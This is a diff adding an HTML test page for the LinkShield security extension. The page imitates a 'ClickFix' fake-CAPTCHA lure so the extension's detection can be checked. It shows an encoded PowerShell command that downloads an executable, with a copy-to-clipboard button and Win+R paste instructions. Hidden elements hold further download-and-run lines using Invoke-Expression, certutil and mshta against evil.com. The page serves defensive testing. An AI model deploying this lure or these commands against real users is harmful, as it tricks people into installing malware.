@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix PowerShell Test - LinkShield</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: #f0f0f0;
+        }
+        .captcha-box {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-width: 400px;
+            text-align: center;
+        }
+        .captcha-box h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .captcha-box .robot-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        .captcha-box p {
+            color: #666;
+            margin-bottom: 15px;
+        }
+        .captcha-box pre {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: left;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+        .captcha-box button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        .test-info {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: #333;
+            color: white;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="test-info">
+        <strong>TEST:</strong> ClickFix PowerShell Attack<br>
+        <strong>Expected:</strong> showSecurityWarning() with severity 'critical'<br>
+        <strong>Triggers:</strong> clickFixPowerShellTitle, clickFixMessage
+    </div>
+
+    <div class="captcha-box">
+        <div class="robot-icon">🤖</div>
+        <h2>Verify you are human</h2>
+        <p>To verify you're not a robot, please complete the following steps:</p>
+        <ol style="text-align: left; color: #666;">
+            <li>Press <strong>Win + R</strong> to open Run dialog</li>
+            <li>Copy and paste the verification code below</li>
+            <li>Press Enter to complete verification</li>
+        </ol>
+        <pre id="malicious-command">powershell -encodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg
+AFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbA
+BvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvAG0AYQBsAHcAYQByAGUALgBjAG8AbQAvAHAA
+YQB5AGwAbwBhAGQALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAF
+wAdABlAG0AcAAuAGUAeABlACIAKQA=</pre>
+        <button onclick="copyCommand()">📋 Copy Verification Code</button>
+        <p style="font-size: 11px; color: #999; margin-top: 15px;">
+            This is a standard security verification required by this website.
+        </p>
+    </div>
+
+    <!-- Additional ClickFix patterns that should be detected -->
+    <div style="display: none;">
+        <!-- Pattern: Invoke-Expression -->
+        <code>Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')</code>
+
+        <!-- Pattern: certutil download -->
+        <code>certutil -urlcache -f http://evil.com/payload.exe C:\temp\payload.exe</code>
+
+        <!-- Pattern: mshta -->
+        <code>mshta http://evil.com/payload.hta</code>
+    </div>
+
+    <script>
+        function copyCommand() {
+            const command = document.getElementById('malicious-command').textContent;
+            navigator.clipboard.writeText(command);
+            alert('Verification code copied! Now press Win+R and paste it.');
+        }
+
+        // Log for test verification
+        console.log('[TEST] ClickFix PowerShell scenario loaded');
+        console.log('[TEST] Expected: LinkShield should detect and show critical warning');
+    </script>
+</body>
+</html>
